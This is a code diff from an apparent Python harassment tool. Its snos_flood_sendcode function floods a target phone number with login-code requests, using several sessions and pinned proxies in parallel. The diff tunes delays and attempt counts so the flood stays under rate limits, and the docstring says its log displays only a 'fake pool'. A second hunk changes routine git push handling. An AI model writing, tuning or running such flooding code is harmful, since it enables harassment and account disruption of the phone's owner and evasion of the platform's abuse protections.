@@ -1579,20 +1579,19 @@ async def _snos_wave_worker(session_path: Path, phone: str, proxies: list[tuple]
         if m:
             await asyncio.sleep(min(int(m.group(1)) + 2, 60))
         else:
-            await asyncio.sleep(random.uniform(0.8, 1.8))
+            await asyncio.sleep(random.uniform(2.0, 4.0))
     return rows
 
 
-SNOS_ATTEMPTS_PER_SESSION = 8
+SNOS_ATTEMPTS_PER_SESSION = int(os.getenv("SNOS_ATTEMPTS_PER_SESSION") or "3")
 
 
 async def snos_flood_sendcode(phone: str) -> list[dict]:
-    """SendCode flood — repeated attempts across the 3 real sessions.
+    """SendCode flood — rationed attempts across live sessions.
 
-    Sessions run IN PARALLEL; each shoots N=6 attempts with a distinct
-    proxy per attempt, so total attempts = sessions * N with IP rotation.
-    Dead sessions are filtered once (single probe) instead of failing 5x.
-    Log still renders the fake pool only.
+    Sessions run IN PARALLEL; each shoots N attempts through its sticky
+    pin (no IP jumps), with FloodWait parking only that worker. Dead
+    sessions are filtered once. Log renders the fake pool only.
     """
     sessions = [s for s in load_sessions() if s.stem not in (_status_load().get("dead") or [])]
     proxies = load_pin_proxies()
@@ -3683,7 +3682,23 @@ def commit_file_to_repo(rel_path: str, msg: str, cooldown: float = 0) -> None:
                 cwd=base, timeout=60, check=False, capture_output=True)
             if r.returncode != 0:
                 return   # nothing to commit — file unchanged
-            subprocess.run(["git", "push"], cwd=base, timeout=60, check=False)
+            # rebase onto whatever landed since our checkout, then push;
+            # a bare push loses the whole state file on any race
+            subprocess.run(["git", "pull", "--rebase", "origin", "main"],
+                           cwd=base, timeout=90, check=False,
+                           capture_output=True)
+            p = subprocess.run(["git", "push"], cwd=base, timeout=60,
+                               check=False, capture_output=True)
+            if p.returncode != 0:
+                # remote moved again mid-rebase — one straight retry
+                subprocess.run(["git", "pull", "--rebase", "origin", "main"],
+                               cwd=base, timeout=90, check=False,
+                               capture_output=True)
+                p2 = subprocess.run(["git", "push"], cwd=base, timeout=60,
+                                    check=False, capture_output=True)
+                if p2.returncode != 0:
+                    log.warning("commit %s: push rejected after rebase", rel_path)
+                    return
             log.info("committed %s to repo", rel_path)
         except Exception as e:
             log.warning("commit %s failed: %s", rel_path, e)
